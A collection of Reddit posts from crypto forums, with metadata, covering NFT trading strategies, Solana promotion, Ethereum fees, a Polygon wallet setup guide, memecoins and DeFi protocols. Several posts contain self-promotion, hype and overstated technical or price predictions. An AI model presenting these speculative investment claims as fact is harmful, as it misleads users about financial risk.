"Finding NFTs before they Explode, 10 repeatable NFT trading strategies and when to use them","one of the most important realizations to make about the nft market as a trader is to understand that there is a critical difference between trading nfts versus trading crypto (or stocks). the difference with nfts is that the people you are competing with in this market are sill, just people. sure you might be competing with whales, people with trading bots, and insiders, but you aren't yet competing with banks, hedge funds, algorithms, etc (i call this ""big money""). it might not seem that crazy, but think about it this way. all of these entities exist for a reason, to make money. actually, i'd argue that these entities sole purpose is to make rich people richer. but, as we all know - there is tons of money to be made in nfts, so why aren't they apeing in? there are a few reasons \* it's still relatively new and unknown \* they are an absolute nightmare from a legal and tax perspective \* ethereum gas fees but the absolute primary reason (i think) is that every single transaction needs to happen through a wallet, and automation is inaccessible short of hiring some (ultra expensive) web3 developers (basically, the dev scene is in its infancy). a few friends have been telling me to get out of nfts, and that they will crash soon due to the supply issue. but in my opinion this is the absolute worst time to get out because once the ""big money"" comes (and they will come) there won't be much left for the rest of us. the key to success in trading nfts is to have a robust trading strategy. this is something the average nft trader does not have, which is why many of them end up in the red. they either trade quickly, wiping out any gains they might make with the gas fees, or hodl, never selling and in most cases riding a dead collection to 0. i find that these are two ends to a spectrum, and the sweet spot is usually the middle. i personally have fallen into both of these traps, but over time i've discovered a few strategies that work regardless of which direction the market is moving. what's cool about nfts is that they are all hype (not all hype, there's utility, gaming use-cases, staking/passive income, etc. but hype and attention is what governs price 90% of the time). this means that a ""crash"" in the nft space is less like a crash in broader crypto - where everything falls together, but more like the sneaker space, where a few brands might suffer, but overall the market remains healthy. so knowing what collections people are interested in (and knowing it early) is a massive competitive advantage. (speaking of which - sneakerheads did/are doing very well in the space) there is no shortage of cool projects, with celebrity backing, innovating, amazing art in the space. so how do you keep track of them all? and how do you decide where to put your money? here's what i think: *for extra alpha, see my write-up over at* [*https://chilly.tools/blog/10-trading-strats-nfts*](https://chilly.tools/blog/10-trading-strats-nfts)*, where i add some charts to visualize the strategies and explain how to use the* *chilly.tools* *bot to automate finding tokens with each strategy* there are only so many strategies that can realistically work at any given time. and their effectiveness is inversely proportional to how many people: 1. know about them 2. use them not all strategies are created equal either, there are strats for when: 1. the floor is going up 2. the floor is going down 3. the floor is going sideways 4. event-based strats i've compiled a list of all the strats i've encountered and used, with varying degrees of success. i'm sharing them here because there's another bull market coming, and a rising tide lifts all ships. it goes without saying that you'll make the most money when the market is moving, especially with proper tooling, but there are also tons of strats that help you make the most of a sideways market. below i'll divide the strats into different sections, and order each strat from most competitive to least competitive. but first: four things one: almost all of these strategies deal with nft rarity, if you're here i'm assuming you know what that is, but if not, \[here is a good explainer\]([https://raritytools.medium.com/ranking-rarity-understanding-rarity-calculation-methods-86ceaeb9b98c](https://raritytools.medium.com/ranking-rarity-understanding-rarity-calculation-methods-86ceaeb9b98c)). two: how can i tell if my collection's floor is going up or down? good question, opensea offers average price under the activity tab, but this is 1. daily, and 2. not the floor. you can check floor movement [here](https://chilly.tools/floor-trick) three: in the various market conditions below, you will see duplicate trading strategy names. make sure to read through them though, because they mean & function slightly differently in different contexts. four: this is not financial advice, always be careful and dyor. the smartest bets are the ones that look good that you also believe in. **strats for when market/collection floor is moving up** this is likely when you can make the most money, if you are careful. 1. (most competitive) floor hunter - when the floor is rising, you'll often find yourself getting out-gassed for any floor-priced nfts, unless you have a bot and are ok with spending extra gas, i'd recommend shooting for nfts 10-20% above floor price, because if floor transactions fail, you're still paying gas fees (yes failed txns still cost gas) 2. straggler sniper - for many collections, especially if the collection has just experienced a sharp drop, people will have listed their nfts at a certain price which might've been fair relative to rarity at the time of listing, however, as floor goes up, many people end up being slow to update their listing. if you can score a 1 eth rank 500 on a collection with 0.7 floor, thats a huge win. here's a graph of rarity vs. price to illustrate what i mean: this is a killer strat because it ends up costing gas to cancel and re-create listings to raise prices, which means it's a great opportunity for us to snatch something unfairly cheap. 3. (least competitive) arbitrage (avg vs floor) - arbitrage (or more aptly described as price discrepancy) is very common in the nft market. there are not enough big players in the market yet to jump on these opportunities before us. there are many different flavors of arbitrage that i've seen work for nfts, and i'll probably write another post explaining all of those if this post ends up doing well. avg vs floor is a discrepancy which is hilariously unutilized. basically, its common for the floor price of a collection to move, but the average stays roughly the same. lets explore both possibilities: * floor moves up, avg stays same: the more common of the two scenarios. when this happens, any listed nft that was fair price before the floor movement is now cheaper. in this case, grab up any nft listed before floor movement that was listed at a fair price among similarly ranked nfts in terms of rarity, quickly re-list at the new fair market value which you can get by doing (new\_floor\_price/old\_floor\_price) \* previously\_fair\_listed\_price. easy flip. * floor moves down, avg stays same: you need to be careful with this one, the collection may keep falling, personally i wait a few hours before entering into anything with this. in this case, the current floor nfts are cheap compared to the average, and it would now be a good time to enter at floor, or exit at average, depending on the market condition for the collection. note: be sure that there hasn't been some event which is making the market move, this only works in a pure market **strats for when market/collection floor is dropping** currently, there are no derivatives that let you take advantage of a falling collection (think shorts, put options, etc.) - however, there are still ways to make money on the way down. 1.(most competitive) floor hunter - it's common for people to panic and list way below floor to get out as soon as possible rather than risking selling for even less. you can take advantage of these by grabbing them up before anyone else gets the chance. actually [chilly.tools](https://chilly.tools) has a feature which scans for these every 5 seconds and just pops up the metamask right away. * careful - this is like catching a falling knife, i'd highly recommend knowing why a collection is tanking before using this (exmple: jungle freaks) 1. rarity floor sniper - this one is less accessible to most people because looking up rarity obviously takes time, and the faster you are able to know the rarity of a specific nft the more of an advantage you have. this strategy assumes that there is a direct correlation between rarity and the price of an nft. * such a correlation would suggest that only looking at the floor and sniping near it means you are missing 90% of snipes. what we can do instead is estimate the fair market price by looking at nfts with similar rarity that sold recently, and compensate for any floor change that occurred. by taking the difference between our estimated fair market price and the listing price, we can find out whether this listing is cheaper than what the market things it should be. * in practice, there ends up being a really strong correlation between rarity and pricing, meaning this is one of the best ways to get ahead of the crowd. 1. paperhands hunter - nervous people reducing price * you'll often see people listing their nft lower and lower, as they get more and more nervous that their nft won't sell. these are often good tokens to put on your watchlist, and maybe make some lowball offers on. it's highly likely that (as long as the nft doesn't sell to someone else) you'll be able to get a really good deal. careful when using these strategies - you'll want to be very confident in your decisions here, because it could be like catching a falling knife. as with anything on this list, be careful and dyor. you'll want to be very confident in the collection to buy on the way down, and depending on how fast the floor is falling - flipping can be very risky as well. **strategies for when market/collection floor is flat** 1. (most competitive) liquidation hunter (hunt nfts when someone needs to urgently liquidate) * sometimes holders hear about an opportunity so lucrative and time-sensitive that they need to liquidate their holdings right away, so they'll list their nft way below floor. this is an amazing chance to scoop up an extremely cheap nft before anyone else can. careful - many people watch a collection when the trend is flat, meaning you're likely going to have 2 or 3 people simultaneously trying to scoop this one up. i'd set the gas higher when checking out. 1. paperhands hunter - its common for people to be getting nervous when a collection stays flat for several days, look out for anyone constantly reducing price - it's an easy flip for when volume returns. **event based** below is a list of strategies that work when certain events happen in a collection's life-cycle 1. mint - this one is somewhat obvious, but when a collection first goes on sale, or ""mints"", there are a few strategies which are very lucrative * whitelist - this one is a lot of work, but it is the most surefire way to secure a few cheap tokens out of a collection. basically, it just involves being a good community member for the nft collection. so that means: inviting people, being active, saying gm alot, or contributing. i personally don't do this unless i really believe in the team over anything. it's a lot of effort, and other strategies have been more lucrative in my experience. * mint bot/gas bot - an alternative to whitelisting is to be one of the few who can score an nft during mint without being on the whitelist. as you can probably imagine, this is incredibly hard to do, and you have to get quite lucky. many popular collections have 1000 tokens (if not less) available for >200k people. you can increase the odds of securing a token by using a gas bot which will automatically increase gas until the trade goes through. again, not something i personally do, but has shown great results for others. 1. rarity reveal - once a collection mints, its very common for the actual art (and therefore rarity) to be hidden. meaning that at this point, every token appears the same as any other. however, a collection will then designate a ""reveal date"" when all art will be revealed at the same time. typically the collection floor will then pretty quickly diverge: the rarer tokens will be listed for much higher, while the most common tokens will often get listed for half, if not less, of the previous floor price. the two strategies i personally look to take advantage of are: * (most competitive) mispriced tokens - many tokens will stay listed through the reveal, meaning that there is a chance a super-rare token is listed for near-floor price. this is however almost impossible to take advantage of without a bot, as this can be a pretty easy 1eth+ flip. [chilly.tools](https://chilly.tools) has a bot for this which will pop up the metamask so you can buy as soon as possible. i'd recommend increasing gas for this as well. * cheap tokens - its typical for the collection floor to slump shortly after the reveal. if you're bullish about the collection, this is a good time to swipe up a few cheap tokens if you weren't able to during mint. in my experience, the collection floor will reach an absolute minimum anywhere from an hour after reveal, to 2 days after. all of these strategies will work best during high-volume periods. you want there to be a buyer on the other end. remember even with these strategies, this is an arms race. you wont win on every trade, but the goal is to come out expected value positive, ideally while minimizing the analysis you need to do. as of writing this, floors are rising across the board - it's a good time to enter if you were on the fence. that's all i have for this post, if this ends up doing well, i'll write another about arbitrage and keep sharing my knowledge. good luck and wagmi \- nikita *disclaimer: i am the founder of* [*chilly.tools*](https://chilly.tools) which brings rarity scores for nfts directly into opensea.",271,138,0.96,2021-12-08 00:00:13,web3,NFT,njerschow,True,227.4

"A summary of Solana, the tech, and why it is the future + comparison to other top projects","**solana** solana will be the future of web3.0. everything you can think of, including any payment processing system, credit card networks, big bank deals, getting loans, stock exchanges, nfts, internet of things, 5g micropayments, cloud computing, energy tracking, supply chain tracking, identity tracking, video streaming, gaming, artificial intelligence, taxes etc. will be based on solana. **a history of blockchains** we started off with the concept of proof of work, where essentially the chance of a miner getting to create the next block on the blockchain is proportional to your computer power. a block on a blockchain is essentially a series of transactions that are published to a public ledger and verifiable to be correct. the amount of computer power you put towards a hashing algorithm (say sha256), then the higher the share you are of the network and more likely you are to generate the next block. these systems have limitations with very low transactions per second (in the tens to hundreds of tps) and time in between blocks (block time). the entire purpose of these systems is to decentralize transactions to ensure one entity is not in charge of writing transactions and is potentially corruptible. in a centralized system, all you need is access to the main system and you can change transaction history and data with ease. examples of proof of work blockchains are ethereum and bitcoin. people started to realize proof of work cannot be the basis of the decentralized web3.0 because of the low tps and high block time. this stems from the time needed to actually do the ""work"" and mine a block. projects like cardano, polkadot, vechain, and theta built on proof of stake were created to solve these issues. cardano has a blocktime of about 20 seconds (which can be lowered) and a tps that is scalable. cardano does not have smart contracts live. polkadot has a blocktime of about 12 seconds on the relay chain, and a tps across all parachains of about 1,000,000 transactions per second. these are the two leading proof of stake blockchains right now. ethereum, the current leader of smart contract blockchains, is moving to proof of stake next year and will have a max transactions per second of 100,000 and a block time of 12 seconds. as we can see, proof of stake solved the tps issue, but not the blocktime issue. if we want wide adoption of a decentralized ledger, block time must come down in order for it to be feasible to host a stock exchange, payments processing system etc. on the blockchain. projects like xrp, stellar, hedera, are more centralized high tps, fast block time chains. unfortunately, these blockchains have 10-100 nodes compared to sol's 500+ which means they are essentially centralized systems. with sol, anyone can make a node if you have 3-4 thousand dollars of hardware. with xrp, stellar, hedera, only a few nodes ran by big businesses can create nodes and verify transactions. even then, the tps of these ledgers vary from 1k to 10k, still much less bandwidth than solana. and the block times of these protocols range from 3-5 seconds, many multiples higher than solanas. solana has a **max tps of 60,000**(which is scalable to infinity with internet bandwidth and cpu/gpu speed increases (aka moore's law) with a **block time of 400 ms (.4 seconds) right now**. solana is already the fastest, and has great potential to be the most decentralized system to ever exist (already very decentralized). it is limited by the network it is built on(internet speed) and is currently as quick as centralized systems can be. this is the first time ever, a decentralized system can actually outperform a centralized system. this will be the catalyst for people to move off of centralized systems to increase their security. before, people didn’t care too much about decentralization because why would you sacrifice tps for decentralization. now, there is no reason not to switch. when you switch, you have more security and retain the same functionality of centralized systems. for example, visa, which processes transactions on a centralized server: if the database or the servers got hacked through a variety of ways, anything could be changed and modified. on solana, to do the same thing, you would have to make a cpu that could outperform all other cpus by a vast margin, something that would require billions and billions of dollars of r&d. solana also has live smart contracts, which opens up the market for defi. **who created it?** solana was created by a team of elite software and systems engineers that specialized in bandwidth optimization, app development and system optimization at intel, qualcomm, dropbox, microsoft, google, twitter, and apple. the creator, **anatoly yakovenko**, is from california and worked at qualcomm as a leader for development of operating systems, distributed systems at mesosphere, and compression at dropbox. he was also the core kernel developer for brew which was the largest phone operating system before iphones/android and powered every cdma flip phone (over 100 million phones). description of brew: the brew solution also includes a server component which resides on the network. the brew server manages the network side of brew downloads, including billing, and can also serve and bill for non-brew applications and content. he has two patents for high performance operating systems protocols. it makes sense that anatoly was able to think of and execute the creation of the unique solana decentralized blockchain because his experience is so closely related to the skills needed to build an efficient blockchain. solana achieved the insane block time by taking tested knowledge and concepts from cell phone towers and bandwidth optimization in systems to improve upon the blockchains that came before him. along with anatoly, many chief software engineers at qualcomm left to join the solana project because they were conveniently being acquired by broadcom. this is how anatoly got such an elite team to build such a progressive project. **the main tech behind solana** solana brings a new method for deciding who processes the next block. it is called it **proof of history**. essentially, timekeeping in typical proof of stake blockchains is important because that’s how you decide when the next node to process the next block is selected. this makes the network vastly inefficient and prevents blocktimes from getting smaller than the time it takes a message to propagate around the entire network. this ends up being 10-12 seconds for most proof of stake blockchains. proof of history uses every nodes cpu to essentially keep time. it uses a recursive hashing algorithm that when the output is fed back in as the input, is able to quantifiably show that a certain amount of time has elapsed and allows the selection for the block leader (the node that processes the next block) to be quicker than 10-12 seconds. the block time is currently set at just .4 seconds, but can decrease even further with anatoly's known goal to make the network so fast that a message from one side of the world travels along fiber and propagates across nodes as quick as light. this is realistically possible with solana. **top projects built on solana** a blockchain is defined by the projects built on top of it. in the past year that solana has been running, it has attracted some of the best developers in the blockchain ecosystem. this is a testament to the sound fundamentals. the project has 300+ and counting projects in the ecosystem with some of the biggest names around commiting to solana. during the most recent hackathon, over 13,000 developers submitted 300+ projects. [https://docs.google.com/spreadsheets/d/1rnvwsmczun2n16j2qriac8f\_xz3v6hndu\_n9igvmfv8/edit#gid=0](https://docs.google.com/spreadsheets/d/1rnvwsmczun2n16j2qriac8f_xz3v6hndu_n9igvmfv8/edit#gid=0) list of \*known projects on solana serum is a decentralized exchange that uses the order book method of typical centralized stock exchanges in order to allow trading. solana is the only blockchain capable of hosting such an ambitious project because of the high tps and low block times. solrise is a decentralized fund managing platform that allows you to invest in people that get great returns while trading entirely within the dapp so you can see very trade your fund manager is doing. during the recent test net competition, multiple people got 30,000+% returns in two weeks with live paper trading.

[https://research.binance.com/en/projects/solana](https://research.binance.com/en/projects/solana) in conclusion, solana is the first highly decentralized (500+ nodes that anyone can start), quick, verifiable public blockchain that is here to exist forever and will be integrated into every single industry that we know today. the tokenomics are good, with a dedicated token minting rate and modest inflation. if you buy sol, be sure to open a solfare wallet which can be done to stake your sol and earn rewards. stake to a node lower than the top 100 in terms of amount of sol staked in order to ensure decentralization! **my opinions** this is a huge deal, and the future of every industry as we know it. i don’t want to speculate and do your own research, but i see the value of the solana network reaching 10 trillion dollars in the next ten years, with honestly infinite upside from there. the current valuation is 20 billion dollars fully diluted. get in before the whales are able to see the potential and the stupid dudes on wall street finally realize what this means. i tried to keep the summary of solana objective but couldn't help my excitement from leaking out in some places. i am very excited to where this project is headed. the project has gained market cap quicker than any of the other coins in the top 100 because people are finally seeing how useful the network will be. it is currently sitting at 14 on [coinmarketcap.com](https://coinmarketcap.com) list of largest coins by market cap. my opinion on other coins: i think polkadot and cosmos (not sure which) will still have a place in the future of the web3.0. they are important interoperability protocols that connect large projects like vechain, theta, ethereum and solana together. projects like vchain and theta will not cease to exists because their own specialized chains they built for their function can currently work. however, long term, like 20+ years, i do think solana will capture 95% of the blockchain and web3.0 space because supply chain blockchains (vechain), video streaming(theta), and defi would all benefit from increases in block finality speeds, higher tps, and lower fees. interesting fact, on average over the past week cardano has bested its own record with 40,000 transactions per day. ethereum has done 1,500,000 per day recently and this is essentially its max with current technology. solana has done 86,400,000 transactions over the past day with ample room to do more. let that sink in. &#x200b; edit: i thought i had heard cake was moving to solana. i now don't believe that is the case as i cannot find any information about it. sorry for the confusion! &#x200b; edit 2: xrp and stellar have around 136 and 51 validator nodes respectively. &#x200b; edit 3: added an edit about being the most decentralized. it is not the most decentralized, but it definitely has potential to be. and how it is now, i would argue it is well on its way to becoming one of the most, if not the most, decentralized blockchains. &#x200b; edit 4: the proper cost to run a node is likely around 3-4k. alot of money, but not insane.",262,148,0.99,2021-04-28 11:55:14,web3,solana,cjwill2017,True,226.29999999999998

Why Solana will win. $40 in eth fees. ,"i just spent $60 dealing with ethereum to acquire two $7 nfts. i sent $10 to my eth wallet from coinbase. this costed $2 tx fee. turns out to mint the nft it costed $10 tx fee, so i send another $10, paying another $2-4 fee. i mint the nft and it works. decided i wanted another, so i decided to send from my solana wallet instead of coinbase. so i used the bridge function. it only takes usdc, fine. i swap to usdc which in solana took seconds and less than a penny tx fee. i do the bridging sending $17 usdc. turns out there's an issue because eth wants $10 for me to ""claim"" my $17 usdc. absolutely ridiculous. since i only had like $7 in my eth wallet i had to send another $15 to my coinbase via solana, then convert to eth and send it that way. another $2 fee. i manage to acquire my $17 paying a $10 tx fee. but to my surprise eth charges $20 swap fee to convert my usdc to eth. never mind. i'm not paying that, so now my usdc is held hostage on my eth wallet and i'm out the $10 it took to claim it. i end up sending even more sol to coinbase swap to eth, this time paying $6 to send to my eth wallet. i then pay for the second $7 nft with a $10 tx fee. the net cost of fees on solana's side? less than a penny for the many swaps and transfers. for the eth side? i paid probably $40 in fees, if not more, and my $17 is stuck on there unless i want to pay another $10 to send, or $20 to swap. all in all i'm out about $40ish from my sol, and $25ish from the eth in my coinbase. all for two $7 nfts that i can't do anything with because to list for sale is $10, to send is $10. absolutely insane. solana is fantastic. no one is going to want to put up with these insane eth fees. and the l2s are so confusing. with solana, things just work.",116,310,0.85,2024-03-29 04:38:33,web3,solana,Kafke,False,202.1

How to easily move your funds to Polygon (MATIC) and begin saving on gas fees,"it’s no secret that one of the biggest problems currently facing ethereum is the high fees to do anything more than just sending coins. a simple swap on uniswap can cost upwards of $50 in fees during high usage times and it is a major barrier to entry for many users. for months people have been proclaiming layer 2 solutions as the current fix until eth 2.0 becomes a reality, but a lot of this advice can seem superficial. i myself am guilty of proclaiming the benefits and ease of layer 2s like polygon or loopring long before i actually took the time to learn how to connect and begin using those platforms. &nbsp; for people just joining the space who are already having a hard time wrapping their heads around the sheer number of layer 1 cryptos, an additional step onto a layer 2 side chain can seem like just too much. the good news is that it’s really easier than you think. i've put together a simple tutorial here to hopefully guide you on your way to near zero fees while taking full advantage of decentralized finance solutions. &nbsp; for the purposes of this tutorial, i’ll assume you already have a metamask wallet, which would be set to connect to the ethereum mainnet as the standard. to begin, you will want to click on where it says “ethereum mainnet” at the top of the metamask extension and click on the option in the dropdown that says “custom rpc” and you will want to enter the following information: &nbsp; --------------------------------------------------------------- network name: **matic mainnet** &nbsp; new rpc url: **https://rpc-mainnet.maticvigil.com/** &nbsp; chain id: **137** &nbsp; currency symbol: **matic** &nbsp; block explorer url: **https://explorer.matic.network/** &nbsp; ------------------------------------------------------------------ &nbsp; this will allow your metamask to connect to the polygon network. you’ll now want to navigate to **https://wallet.matic.network/** which will then ask you if you want to connect your metamask. select that option. you will then see a banner showing that you have a $0 balance and an option to move funds from your ethereum wallet to the polygon wallet. &nbsp; select “move funds to matic mainnet” and on the next screen, make sure the transfer mode is set to “pos bridge”. select the token and how much you want to move over, and then click “transfer”. click continue through the the next few screens which are just confirmations of gas fees and your intended transfer. the fee here is an ethereum network fee and will be the only major fee paid for moving your assets to polygon. once on the network, fees are near zero. &nbsp; after you do this, go to your metamask, click on where it says “ethereum mainnet” at the top, then click on the matic mainnet option we set up in the beginning. now you can navigate to any dapp that has integrated polygon’s matic layer 2 solution such as aave, or quickswap. &nbsp; i hope this helps!",236,120,1.0,2021-05-09 19:18:39,web3,defi,charmcitycuddles,False,199.6

Don’t underestimate stablecoins.

Solana vs Base: Bets on The Next Big Bull Run Ecosystem,"by all accounts, we are in a crypto bull market, so you might be asking yourself: which ecosystems are set to deliver the best gains for investors over the coming months? all eyes have been on solana of late; a layer 1 network which has gained a degree of critical mass thanks to the sure of meme coin launches on the chain – some of which have minted millionaires over the past few months. sol has enjoyed a steady price run, up to $200 per token, and looks set to break past aths as the year progresses. despite all the attention, however, solana has shown signs of congestion – a typical symptom of a busy network onboarding a mass of new users. while retail flocks to the chain, there is no doubt that the more saturated the ecosystem becomes, the harder it will be to separate the wheat from the chaff both in terms of credible projects and returns. i've certainly had my fair share of poor investments in badly run/rugged projects as well as some fantastic ones too, some of which include $slerf before taking profits and putting that into a porsche parody $powsche which seems to have a lot of potential. but, if not solana, where should we be looking for our next 100x gems? well, coinbase's base layer 2 network enjoyed a rather subdued launch in august last year, and has quietly been accumulating a healthy tvl which now stands at $685,44m. with the backing of one of the world's largest cexes, there's no doubt that the base ecosystem stands to onboard the next wave of retail users into the space. being an l2, base benefits from ethereum's security as a settlement layer, while providing blazing fast throughput thanks to roll-ups – all at even cheaper fees than solana. part of this is also thanks to the eth dencun upgrade, which has slashed average transaction fees by 60%, and in turn, led to a 350% increase in transactions. more exciting news is that base will be launching its own wallet (the existing custodial coinbase wallet already works a treat with base network tokens). however i'm not a big fan of the fact that it is owned by coinbase as i fear that this could lead us down the path of being even further centralised. with more projects launching on base, we're seeing increased liquidity and smart money pouring in. as much as i'm a fan of the solana ecosystem. base is seeing the early mover advantage has already allowed users to make decent returns on early investments.",232,110,0.93,2024-03-29 14:00:51,web3,solana,[deleted],False,192.5

Solana Will Flip ADA Very Soon,"edit 2: hello to all the ada people who raided this thread. it seems you guys are great at taking criticism! ban anyone who has concerns about the project from your subreddit, then raid other subs when anything negative is said. this is why i’ve called the cardano community a cult before. here in r/solana, users are welcome to bring up their problems or concerns with the network, and it’s discussed at length. the ada community seems physically incapable of taking any kind of criticism, even if it’s constructive. i sincerely wish ada good luck in the future, but this is simply one more reason why i’m glad i got out of ada myself. _______________________________ edit: it seems the transactions are completing, and they’re simply delayed for a period of time until the mempool frees up space. i know ada is working on increasing the size of the mempool. but i would argue this is slapping a bandaid on a gaping wound. that said, i want to be factually correct here. thanks for setting me straight u/zaytion! _______________________________ a couple months ago when the attack took down solana validators, the cardano and ethereum people showed up in this sub to talk mad shit about how our project is going to zero. well here we are a couple days after hitting a new ath! i just went into the cardano subreddit to see what the sentiment is like there. it turns out, the network mempool is already full and people have been waiting for 30 minutes for their transactions to ~~then fail~~ complete. i’ve been saying for a long time that cardanos design philosophy puts them at a huge disadvantage. but i didn’t think the cracks would start to show already. cardano current tps is supposedly less than eth. with smart contracts delayed for almost 3 years, i don’t think hydra is coming anytime soon. tldr: cardano is unfortunately outdated, and solana is the future of web 3.0! you backed the right project!",190,173,0.81,2021-10-29 12:54:56,web3,solana,TITANIC_DONG,False,191.29999999999998

What's the point of these blockchain metaverse games?,"i've been researching blockchain metaverses lately and i fail to see why this is cool or why this would benefit the average user. for those of you who don't know: a bunch of these block chain metaverses have been popping up lately. things like earth 2, tcg, polkacity, derace etc. they are virtual worlds where you buy critters, land, taxis, services, horses, and hopefully one day, once mass adoption comes, you can make passive income while players use your services, or massive income by selling your digital assets, like a digital lambo for someone else to drive around. it seems like people are trying to create virtual economies, but why would anyone want to participate? what's in it for the average player? you get to play a game where most assets are already monopolized by 10% of the players? and would the game even be fun? like, why grind for money to play blockchain gta online when you can just play actual gta online for $60? why play blockchain farmville when you can just play regular ass farmville? you know what i mean? these games aren't offering reason why a blockchain nft version of it is beneficial over a regular game. developers are rushing to create these blockchain metaverses and not thinking about why a blockchain virtual world is better than one crafted by a regular video-game company. in my view, it's actually worse for the average player because they have to invest real money on fake assets because they are either a gambling addict and are hoping to make real money on it someday, or because their dopamine receptors are being abused by these stupid, predatory games made to make you fill fomo all the time. the only people excited about this as far as i can see are those trying to make a buck by pumping and dumping metaverse coins. what do you guys think ? am i failing to understand something? is anyone here actually excited about metaverse games and willing to defend their reasoning for it?",177,187,0.97,2021-10-31 13:54:42,web3,CryptoTechnology,ChurritoDealer,False,190.7
Brief introduction to some of the top DeFi protocols,"hi all, i've put together a list of some of the top defi projects along with a brief explanation of each: **maker dao** - lending/borrowing makerdao is a decentralized system for collateralized loans that people can lock up their eth in to receive the daos stablecoin, dai. when someone locks up eth, they are able to take out a loan of a smaller amount in dai, which is pegged to the us dollar. a deposit of $1000 eth would allow the user to take out a loan of roughly $650. when the person wants to get their eth back, they simply pay back their loan along with any fees. the native token of this protocol, mkr is used in a twofold manner. it primarily acts as a form of support for the loan system as the price of eth drops. when too many loans are liquidated at once, mkr is created and sold to pay off the loans, as well as bought back from proceeds from liquidation fees. it also serves an additional role as a governance token allowing holders to vote on how high fees should be and which types of collateral should be accepted by the system’s smart contracts. maker has become one of the flagship protocols in the defi boom but as we saw with markets crash caused by coronavirus, there remains significant risk investing/pooling money in these protocols which can suddenly become destabilized due to unpredictable events. though covid isn’t the first existential crisis maker has faced, having dealt with hacks in the past, the community has continued to persist and has shown impressive resilience to move past these troubles, often coming out stronger and with a more guided roadmap. it is the largest defi protocol by locked value at $6.57 billion. **aave** - lending/borrowing aave is a decentralized network of collateralized lending pools run by smart contracts that allow people to freely lend or borrow crypto. in december 2020, they rolled out version 2 of their protocol. previously when holders provided crypto for collateral on loans, it was locked in to that collateral. the new update allows users to easily transfer their collateral from one coin to another without having to repay their loan or pull it out of aave. this increases people’s ability to manage liquidation risk by being able to swap their collateral if the original asset began falling in price. the governance token, aave, is used by holders to determine various changes to the rules and policies of the protocol. holding the token also provides the user various bonuses such as reduced fees/rates, higher borrowing limits, and advance access to certain pools. aave has also innovated “flash loans”, uncollateralized short term loans that are issued and settled within the same block of transactions. aave’s version 2 is far from the end for this project. ceo stani kulechov has mentioned that upcoming changes will improve and add additional nuance to both governance and its flash loans, while also working to reduce gas fees across the board. **yearn finance** - asset management yearn finance is a defi protocol that gives users ytokens in exchange for crypto deposits that are then lent out via various other services such as aave or compound for the highest rate of return. yearn.finance was created by andre cronje who promptly gave up the protocol and transferred governance to a smart contract that requires a supermajority to institute changes. there is a fixed supply of 30,000 yfi tokens. yearn.finance automatically reallocates investors’ funds and finds them the highest yield across various defi products. in other words, it gives the average crypto investor access to more advanced strategies through a user friendly user interface. it’s name recognition and ease of use will ensure that as the space continues to grow, it will remain as many investors’ first introductions to field farming strategies. though in itself not high risk, yearn searches a number of high yield bearing products that can oftentimes lead to investors’ funds being put into instruments they may not personally be comfortable with. though these may not be entirely “unsafe”, it’s fair to ask whether many of the new investors being introduced to defi via yearn would feel comfortable if they knew some of the riskier strategies their funds were subject to. additionally, the nature of crypto’s rapidly changing market conditions can lead to volatile price swings across the market and the value of yield farming assets are always at risk of becoming worthless. **uniswap** - decentralized exchange uniswap is the most popular and most used decentralized exchange (dex) built on ethereum. it made headlines last summer when it surprised early users by airdropping 400 uni tokens (roughly $1,200 at the time) to anyone who had used the platform. the uni token is used to govern the uniswap exchange and holders can vote on various proposals and will eventually be the sole decision makers of uniswap. people can use uniswap to trade any token built on ethereum and can also provide eth and other tokens to supply liquidity, earning fees and sometimes other rewards. at one point uniswap held 20% of all funds locked in defi protocols and had nearly 50,000 daily users and it still remains hugely popular. due to the surprise airdrop, the token is widely distributed among the crypto community. it’s also one of the most popular platforms users are introduced to deeper defi concepts such as liquidity pools and yield farming. many uniswap users not only use the exchange for swapping their tokens, but also to earn rewards by providing liquidity. many of these rewards provide outstanding returns which is incredibly enticing. however there’s an underlying risk to it that many people don’t understand well. it’s called impermanent (or divergence) loss and it occurs when the price of the pooled token moves far from the price the user initially provided it for.when the automated market maker sells tokens to maintain the desired ratio, the underlying amounts provided are sightly affected. this risk is often offset by the fees and rewards earned, but could present a significant risk in a volatile market. **synthetix** - derivatives synthetix allows holders to stake their snx tokens to create on-chain synthetic versions of real world assets such as gold, foreign currencies, and recently oil. it also allows holders to create shorting products such as ibtc or ieth. synthetix was founded by kain warwick, having raised nearly $4 million in private funding from framework ventures. governance was originally handled by a foundation which has since been dissolved and replaced by three decentralized autonomous organizations (daos) that snx holders can vote on decisions for the future of the protocol. synthetix had over $800 million in total locked value at its height and continues to hold above $700 million staked with over $125 million in circulating synthetic assets. their success shows the strong demand for the ability to trade censorship free real world assets on-chain and they continue to research, develop, and release new products. their inverse products (ieth, ibtc, ioil etc..) are a unique way to introduce shorting strategies to defi newcomers as each isynth token has an entry point, an upper limit, and a lower limit at which point the price is frozen and the inverse asset’s holder is liquidated into a usd pegged stablecoin to help manage risk. sythentix’s strategy of bridging traditional legacy assets and new digital assets through these innovative products presents a strong case for snx as the space develops and matures. one of the downsides to synthetix is its unusually high collateralization ratio, requiring 750% of staked snx to the value of the synth asset. additionally snx is more volatile than other assets such as eth which can lead to higher risk when it comes to keeping your ratio intact. though staking eth is available, it offers none of the reward incentives that snx does. **compound** - lending/borrowing compound is a decentralized crypto lending and borrowing protocol run by algorithms and smart contracts. anyone with an internet connection and a crypto wallet such as metamask can supply their crypto or borrow assets at interest rates set by real time supply and demand. this allows people to lend and borrow without having to negotiate terms through a middle man such as a bank. when people deposit their crypto funds into compound, they are provided c-tokens (ceth, cdai etc) which represent a claim to their portion of the asset pool. similar to other defi protocols, loans are overcollateralized. that is, you must provide more value in crypto as collateral than you can borrow a loan for. compound was initially started as a company by robert leshner and funded by vc, but since the release of the comp token has been gradually decentralized handing control and governance to the community. votes have been held to add coins, adjust interest rates, and various other improvement proposals. one of the inherent risks in compound’s model is the risk taken on by borrowers who use the funds to buy more of their collateral. if an investor deposits eth, then uses their loan to buy more eth, a sharp drop in the price could lead to not only a call on their loan, but also complete liquidation of their collateralized eth. overall, compound is fairly simple to use and understand which will continue to allow it to be a major player in the defi community as more people and institutions join the space. **renvm** - assets and derivatives a major problem with the current defi system (and really, the overall crypto space) is interoperability. that is, roughly 75% of the total crypto market cap is outside of the ethereum blockchain and thus not able to participate and interact with the current major defi protocols. renvm is trying to solve this by wrapping outside assets, acting as a decentralized version of bitgo’s wbtc. someone who holds bitcoin can send their btc to renvm which acts as a decentralized custodian, and then issues them the ethereum token renbtc which is backed, and has the same value as btc. not limited to just ethereum, renvm can provide this service for just about any digital asset and smart contracting platform. 